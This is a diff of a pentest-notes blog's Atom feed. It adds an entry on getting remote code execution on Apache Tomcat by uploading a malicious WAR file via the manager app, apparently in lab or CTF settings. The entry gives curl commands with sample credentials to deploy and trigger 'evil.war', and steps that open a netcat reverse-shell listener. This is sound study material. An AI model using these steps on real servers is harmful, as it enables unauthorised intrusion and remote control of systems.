@@ -4,13 +4,82 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-05-24T18:03:25+08:00</updated>
+ <updated>2022-05-28T18:16:24+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Uploading malicuous JAR or WAR file</title>
+   <link href="https://mvineza.github.io/spindel/2022/05/28/uploading-malicuous-jar-or-war-file"/>
+   <updated>2022-05-28T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/05/28/Uploading-malicuous-JAR-or-WAR-file</id>
+   <content type="html">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Attacker can deploy malicuous JAR or WAR file to gain RCE.&lt;/p&gt;
+
+&lt;h1 id=&quot;versions-tested&quot;&gt;Versions Tested&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Tomcat 9.0.31&lt;/li&gt;
+  &lt;li&gt;Tomcat 7.0.88 (Microsoft Windows Server 2012 R2 Standard)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;steps---cli&quot;&gt;Steps - CLI&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Generate war file. See tomcat part on [[Reverse Shell and Web Shells]]&lt;/li&gt;
+  &lt;li&gt;Upload&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;webdev:password123&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--upload-file&lt;/span&gt; evil.war &lt;span class=&quot;s1&quot;&gt;&apos;http://10.10.163.51:8080/manager/text/deploy?path=/evil.war&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Verify&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;webdev:password123&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://10.10.163.51:8080/manager/text/list&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Open netcat listener on attacker machine&lt;/li&gt;
+  &lt;li&gt;Execute&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;webdev:password123&apos;&lt;/span&gt; http://10.10.163.51:8080/evil.war
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;steps---gui&quot;&gt;Steps - GUI&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Ensure you have access to host manager app&lt;/li&gt;
+  &lt;li&gt;Create JAR file. See [[Reverse Shell and Web Shells]]&lt;/li&gt;
+  &lt;li&gt;Upload it via manager app and deploy&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Uploading%20malicuous%20JAR%20or%20WAR%20file/B3786FC8-1BE8-49F3-8D7C-D7D5577D73D9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Open netcat listener&lt;/li&gt;
+  &lt;li&gt;Access the servlet and enjoy&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -u &apos;bob:bubbles&apos; http://thm:1234/evil
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;alernatives&quot;&gt;Alernatives&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;You can also upload &lt;a href=&quot;https://www.youtube.com/watch?v=yTHtLi9YZ2s&amp;amp;t=1050s&quot;&gt;jsp&lt;/a&gt; file instead of war file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/Uploading%20malicuous%20JAR%20or%20WAR%20file/3D882918-7ECC-4D4C-8D20-0FEDF14E4C45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/mgeeky/tomcatWarDeployer&quot;&gt;Tomcat deployer&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=PJeBIey8gc4&amp;amp;t=1362s&quot;&gt;HTB jerry&lt;/a&gt; - uploading cmd.jsp&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Decyrpting Admin password using DNSpy debug</title>
